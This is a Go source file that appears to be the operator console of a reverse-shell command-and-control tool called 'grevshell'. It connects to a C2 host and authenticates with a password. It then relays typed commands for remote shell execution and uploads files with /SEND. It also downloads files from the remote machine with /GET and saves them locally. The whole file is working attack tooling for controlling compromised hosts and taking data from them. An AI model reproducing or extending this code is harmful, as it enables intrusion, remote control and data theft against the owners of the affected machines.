package main 

import (
	"log/slog"
	"fmt"
	"bufio"
	"os"
	"path/filepath"
	"strings"
	"flag"
	"net"

	"grevshell/grevcore"
)

var (
	C2Host		string
	C2Port		string
	C2Password	string
)

func main() {
	flag.StringVar(&C2Host, "h", "localhost", "Specify the host's address.")
	flag.StringVar(&C2Port, "p", "9999", "Specify the host's port.")
	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")
	
	flag.Parse()

	stream, err := net.Dial("tcp", fmt.Sprintf("%s:%s", C2Host, C2Port))

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
	key, err := grevcore.DeriveKey(stream)

	if err != nil {
		slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
		return
	}

	err = grevcore.SendPacket(stream, grevcore.Packet{grevcore.AuthHeader, "", []byte(C2Password)}, key)

	if err != nil {
		slog.Error("An error occured while exchanging authentication.", slog.Any("ERROR", err))
		return
	}

	authResponse, err := grevcore.ReceivePacket(stream, key)

	if err != nil {
		slog.Error("An error occured while receiving authentication.", slog.Any("ERROR", err))
		return
	}

	if authResponse.Header == grevcore.AuthFail {
		slog.Info("Authentication Failed.")
		return
	}

	ProcessLoop(stream, key)
}


func ProcessLoop(c net.Conn, key []byte) {
	send := bufio.NewReader(os.Stdin)
	defer c.Close()

	for {
		var packet grevcore.Packet
		fmt.Printf("%s - $ ", c.RemoteAddr())
		line, err := send.ReadString('\n')

		if err != nil {
			slog.Error("An error occured while reading the command.", slog.Any("ERROR", err))
			continue
		}

		fields := strings.Fields(line)

		if len(fields) == 0 {
			continue
		}

		switch fields[0] {
		case "/SEND":
			packet.Header = grevcore.FileReceiveHeader

			filename := fields[1]
			data, err := os.ReadFile(filename)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				break;
			}

			packet.FileName = filename
			packet.Data = data 

		case "/GET":
			packet.Header = grevcore.FileSendHeader
			filename := fields[1]

			packet.FileName = filename

		case "/EXIT":
			return

		case "/CANCEL":
			packet.Data = []byte("\x03")

		default:
			packet.Header = grevcore.ShellExecHeader
			packet.Data = []byte(line)
		}

		err = grevcore.SendPacket(c, packet, key)

		if err != nil {
			slog.Error("An error occured while sending the request.", slog.Any("ERROR", err))
		}

		recv, err := grevcore.ReceivePacket(c, key)

		if err != nil {
			slog.Error("An error occured while receiving the response.", slog.Any("ERROR", err))
		}

		if recv.Data == nil {
			return
		}

		switch recv.Header {
		case grevcore.FileReceiveHeader:
			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
				return
			}

		default:
			fmt.Printf("%s\n", recv.Data)
		}

	}
}
